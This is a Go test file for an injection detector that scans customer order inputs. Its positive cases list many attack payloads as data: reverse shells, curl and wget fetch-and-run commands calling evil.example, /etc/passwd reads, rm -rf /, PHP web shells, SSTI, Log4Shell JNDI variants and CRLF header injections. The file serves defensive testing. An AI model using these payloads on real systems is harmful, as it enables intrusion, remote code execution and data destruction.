@@ -1,0 +1,322 @@
+package detect
+
+import (
+	"strings"
+	"testing"
+	"time"
+
+	"github.com/ergasterion-dev/pylolith/internal/model"
+)
+
+// injectionLegit is realistic customer input (delivery notes, product names,
+// reviews, addresses, contact details) that no injection detector may flag.
+var injectionLegit = []string{
+	"milk & bread",
+	"Gate code 1234 & leave at door",
+	"see you; thanks",
+	"Basmati Rice (5 kg)",
+	"Long-grain; aged 2 years. Best for biryani/pulao.",
+	"price: {{ check later }}",
+	"Fresh & tasty 😋 – 5/5!",
+	"Flat 3B, Rajbagh",
+	"id card copy",
+	"cat food 2kg",
+	"50% off",
+	"ayesha.khan@example.com",
+	"https://example.com/review",
+	"$5 off",
+	"${price}",
+	"{{name}}",
+	"House #12, Lal Chowk, Srinagar 190001",
+	"Please ring the bell, don't knock.\nCall on arrival.\r\nThanks!",
+	"دودھ اور روٹی، دروازے پر چھوڑ دیں",
+	"दूध और ब्रेड; गेट पर छोड़ दें",
+}
+
+func assertHits(t *testing.T, name string, fn func(string) (Hit, bool), want Hit, vals []string) {
+	t.Helper()
+	for _, v := range vals {
+		hit, ok := fn(v)
+		if !ok {
+			t.Errorf("%s(%q) = no hit, want hit", name, v)
+			continue
+		}
+		if hit != want {
+			t.Errorf("%s(%q) = %+v, want %+v", name, v, hit, want)
+		}
+	}
+}
+
+func assertNoHits(t *testing.T, name string, fn func(string) (Hit, bool), vals []string) {
+	t.Helper()
+	for _, v := range append(vals, injectionLegit...) {
+		if hit, ok := fn(v); ok {
+			t.Errorf("%s(%q) = %+v, want no hit", name, v, hit)
+		}
+	}
+}
+
+func TestCmdIPositives(t *testing.T) {
+	want := Hit{RuleID: "PYL-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
+	assertHits(t, "CmdI", CmdI, want, []string{
+		"; id",
+		"| cat /etc/passwd",
+		"`whoami`",
+		"$(curl http://evil.example/x.sh | sh)",
+		"&& wget http://evil.example/m -O /tmp/m",
+		"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+		"; nc -e /bin/sh 10.0.0.1 4444",
+		`& type C:\Windows\win.ini`,
+		"; powershell -enc SQBFAFgA",
+		"9999999999; cat /etc/passwd",
+		"() { :; }; /bin/bash -c 'cat /etc/passwd'",
+		// Beyond the brief.
+		"x;id",
+		"$(id)",
+		"|| ls -la",
+		"1\nid",
+		"a; /usr/bin/id",
+		"& DIR C:\\",
+		"; uname -a",
+		"%3B%20id",
+		"; rm -rf /",
+		"| ping -c 3 10.0.0.1",
+		"&& curl -s evil.example | sh",
+		"; python -c 'import os'",
+		"; chmod +x /tmp/m",
+		"0<&196;exec 196<>/dev/udp/10.0.0.1/53",
+	})
+}
+
+func TestCmdINegatives(t *testing.T) {
+	assertNoHits(t, "CmdI", CmdI, []string{
+		"see you; id card copy",
+		"Bring your ID; ID card copy needed",
+		"Call on arrival\nID",
+		"milk | cat food",
+		"Toys; cat $5 each",
+		"type of rice?",
+		"Rice; type: basmati",
+		"Hair care | curl cream",
+		"Ring bell; ping me when here",
+		"Flat 3B; rm 12",
+		"Pets: snake | python",
+		"Birthday bash; balloons & cake",
+		"Sizes S | M | L | XL",
+		"Rs 500; /kg",
+		"Go straight; dir left after the mosque",
+		"cat/dog bowl; cat /2 bags",
+		"Monday & Tuesday & cmd",
+		"Smile () thanks",
+		"ls",
+		"whoami is a fun game",
+		"Fresh & ls brand",
+		"Leave with guard & sh. Ali",
+		"Nice shop | nice people",
+	})
+}
+
+func TestCodeIPositives(t *testing.T) {
+	want := Hit{RuleID: "PYL-CODEI-001", Category: model.CatCodei, Severity: model.SeverityCritical}
+	assertHits(t, "CodeI", CodeI, want, []string{
+		"<?php system($_GET['c']); ?>",
+		"eval(base64_decode('cGhwaW5mbygpOw=='))",
+		"require('child_process').exec('id')",
+		// Beyond the brief.
+		"<?= `id` ?>",
+		"<?PHP echo 1; ?>",
+		"assert (base64_decode('cGhwaW5mbygpOw=='))",
+		"process.mainModule.require('child_process').execSync('id')",
+		`require("child_process").spawn("sh")`,
+		"%3C%3Fphp%20phpinfo()%3B",
+	})
+	ser := Hit{RuleID: "PYL-CODEI-002", Category: model.CatCodei, Severity: model.SeverityCritical}
+	assertHits(t, "CodeI", CodeI, ser, []string{
+		"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
+		"aced00057372001",
+		"data=rO0ABXNy",
+		"ACED0005737200",
+	})
+}
+
+func TestCodeINegatives(t *testing.T) {
+	assertNoHits(t, "CodeI", CodeI, []string{
+		"eval(uation) pending",
+		"assert your rights",
+		"<? what is this",
+		"Is it <?",
+		"base64_decode is a function name",
+		"child process care",
+		"the process. mainModule",
+		"aced0005-9b1e-4c1a-8f00-123456789abc",
+		"order xrO0ABXNy",
+		"Room 0AB, block 5",
+		"I'm in the middle of a process.",
+	})
+}
+
+func TestLDAPPositives(t *testing.T) {
+	want := Hit{RuleID: "PYL-LDAP-001", Category: model.CatLDAP, Severity: model.SeverityHigh}
+	assertHits(t, "LDAP", LDAP, want, []string{
+		"*)(uid=*))(|(uid=*",
+		// Beyond the brief.
+		"admin)(&(password=*)",
+		"x)(!(objectClass=*)",
+		"*)(objectClass=*",
+		"%2A%29%28uid%3D%2A",
+	})
+}
+
+func TestLDAPNegatives(t *testing.T) {
+	assertNoHits(t, "LDAP", LDAP, []string{
+		"(2 pcs)(blue)",
+		"Rice (5 kg) * (2)",
+		"smile :)(",
+		"*(see note)",
+		"a*b",
+		"Size (M)(L) & (XL)",
+		"5 stars* (see review)",
+	})
+}
+
+func TestSSTIPositives(t *testing.T) {
+	want := Hit{RuleID: "PYL-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
+	assertHits(t, "SSTI", SSTI, want, []string{
+		"{{config.items()}}",
+		"{{''.__class__.__mro__[1].__subclasses__()}}",
+		"${T(java.lang.Runtime).getRuntime().exec('id')}",
+		"{{ .Env }}",
+		// Beyond the brief.
+		"{{config}}",
+		"{{ self._TemplateReference__context }}",
+		"{{request.application.__globals__}}",
+		"{{ 7*7 }}",
+		"{{ x | safe }}",
+		"{{ lipsum() }}",
+		"#{7*7}",
+		"#{T(java.lang.Runtime)}",
+		"<%= 7*7 %>",
+		"{% import os %}",
+		"{%for x in y%}",
+		"%7B%7Bconfig%7D%7D",
+		"{{ {{config.items()}}",
+	})
+}
+
+func TestSSTINegatives(t *testing.T) {
+	assertNoHits(t, "SSTI", SSTI, []string{
+		"{{ first_name }}",
+		"Hi {{name}}, your order {{order_id}} is ready",
+		"{{ self pickup }}",
+		"{{ special request please }}",
+		"{{ configure later }}",
+		"{{...}}",
+		"{{",
+		"}} {{",
+		"Order #{12}",
+		"Flat #{3B}",
+		"#1 seller",
+		"<% off",
+		"50% {%} off",
+		"{% discount %}",
+		"Total ${ 500 }",
+		"${T}",
+	})
+}
+
+func TestJNDIPositives(t *testing.T) {
+	want := Hit{RuleID: "PYL-JNDI-001", Category: model.CatJNDI, Severity: model.SeverityCritical}
+	assertHits(t, "JNDI", JNDI, want, []string{
+		"${jndi:ldap://evil.example/a}",
+		"${${lower:j}ndi:${lower:l}dap://evil.example/a}",
+		"${jndi:rmi://evil.example/x}",
+		"${jndi:dns://evil.example/a}",
+		// Beyond the brief.
+		"${JnDi:ldap://evil.example/a}",
+		"${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}",
+		"${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://evil.example/a}",
+		"${${upper:j}${upper:n}di:ldap://evil.example/a}",
+		"User-Agent: ${jndi:ldap://evil.example/a",
+		"%24%7Bjndi:ldap://evil.example/a%7D",
+	})
+}
+
+func TestJNDINegatives(t *testing.T) {
+	assertNoHits(t, "JNDI", JNDI, []string{
+		"${name} lower:",
+		"jndi:ldap is a Java thing",
+		"${lower:hello}",
+		"${::-x}${::-y}",
+		"}}}${${${",
+	})
+}
+
+func TestCRLFPositives(t *testing.T) {
+	want := Hit{RuleID: "PYL-CRLF-001", Category: model.CatCRLF, Severity: model.SeverityHigh}
+	assertHits(t, "CRLF", CRLF, want, []string{
+		"x%0d%0aSet-Cookie:%20admin=true",
+		"x\r\nSet-Cookie: admin=true",
+		// Beyond the brief.
+		"x\nset-cookie : a=1",
+		"x%0aLocation:%20http://evil.example",
+		"x\r\nLocation: //evil.example",
+		"x%0D%0AContent-Length:%200",
+		"x\r\nContent-Type: text/html",
+		"x\rTransfer-Encoding: chunked",
+		"x\r\nAccess-Control-Allow-Origin: *",
+	})
+}
+
+func TestCRLFNegatives(t *testing.T) {
+	assertNoHits(t, "CRLF", CRLF, []string{
+		"Line 1\nNote: ring bell",
+		"Address:\r\nFlat 3B\r\nLocation: near masjid",
+		"Item list\nContent: rice, dal",
+		"Time:\n5pm",
+		"Notes\r\nSet up a time: 5pm",
+		"Set-Cookie: on one line is just text",
+		"Cookie: chocolate chip\nCookies: 2 packs",
+	})
+}
+
+// TestInjectionAdversarialTime checks the scanners stay linear on long
+// repetitions of their own trigger sequences.
+func TestInjectionAdversarialTime(t *testing.T) {
+	inputs := map[string]string{
+		"cmdi":  strings.Repeat("; id x", 1400),
+		"ldap":  strings.Repeat(")(", 4096),
+		"ssti":  strings.Repeat("{{", 4096),
+		"ssti2": strings.Repeat("{{ a ", 1600) + "}}",
+		"ssti3": strings.Repeat("{%", 4096),
+		"ssti4": strings.Repeat("#{", 4096),
+		"jndi":  strings.Repeat("${::-", 1600) + strings.Repeat("a", 512) + strings.Repeat("}", 1600),
+		"jndi2": strings.Repeat("${", 4096),
+		"jndi3": strings.Repeat("${a", 1365) + strings.Repeat("}", 1365),
+		"cmdi2": strings.Repeat("|", 8192),
+		"shock": strings.Repeat("() {", 2048),
+		"crlf":  strings.Repeat("\r\n", 4096),
+		"codei": strings.Repeat("<?eval(", 1170),
+	}
+	fns := []func(string) (Hit, bool){CmdI, CodeI, LDAP, SSTI, JNDI, CRLF}
+	for name, in := range inputs {
+		for _, fn := range fns {
+			if d := bestOf(3, func() { fn(in) }); d > 2*time.Millisecond {
+				t.Errorf("%s: %v on %d bytes, want under 2ms", name, d, len(in))
+			}
+		}
+	}
+}
+
+// bestOf returns the fastest of n runs of f, to keep scheduler noise out of
+// timing assertions.
+func bestOf(n int, f func()) time.Duration {
+	best := time.Duration(1<<63 - 1)
+	for i := 0; i < n; i++ {
+		start := time.Now()
+		f()
+		if d := time.Since(start); d < best {
+			best = d
+		}
+	}
+	return best
+}
